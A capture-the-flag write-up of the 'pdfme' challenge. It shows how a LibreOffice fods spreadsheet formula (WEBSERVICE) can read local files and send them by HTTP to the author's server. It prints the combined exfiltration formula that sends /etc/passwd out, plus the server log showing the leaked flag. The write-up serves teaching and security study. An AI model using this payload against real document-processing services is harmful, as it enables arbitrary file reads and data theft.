# pdfme

This challenge is very similar to another challenge in DCTF final 2018.

But I didn't solve it when I participated in the DCTF, so this challenge still took me a lot of time.

First, we should find a valid `fods` file. And I use [this](https://github.com/BuffaloWill/oxml_xxe/blob/master/samples/sample.fods) from oxml_xxe repo.

(fods file is OpenDocument Flat XML spreadsheet format.)

We can try to use some libreoffice macro/function to read file or exfiltrate data.

There is a function `WEBSERVICE` that we can use it to read local file or send http request.

`=COM.MICROSOFT.WEBSERVICE(&quot;http://kaibro.tw/x&quot;)` => send http request to my server

`=COM.MICROSOFT.WEBSERVICE(&quot;/etc/passwd&quot;)` => read the local file `/etc/passwd`

Combine!

`=COM.MICROSOFT.WEBSERVICE(&quot;http://kaibro.tw/x&quot;&amp;COM.MICROSOFT.WEBSERVICE(&quot;/etc/passwd&quot;))`

Then it will read the `/etc/passwd` file and send the content to our server like this:

![](https://i.imgur.com/NXCbuuF.png)

So we have an arbitrary file read vulnerability now.

But the flag is not in the root directory, we should find the path of the flag first.

After fuzzing, I found there is a weird user `libreoffice_admin` from `/etc/passwd`.

So when I tried to read `/home/libreoffice_admin/flag`, it send the real flag to my server!

`[01/Jun/2019:22:05:06 +0000] "OPTIONS /xfb%7Bwh0_7h0u6h7_l1br30ff1c3_c4n_b3_u53ful%7D%0A HTTP/1.1" 200 193 "-" "LibreOffice"`

flag: `fb{wh0_7h0u6h7_l1br30ff1c3_c4n_b3_u53ful}`

payload: [flag.fods](https://github.com/w181496/CTF/blob/master/fbctf2019/pdfme/flag.fods)

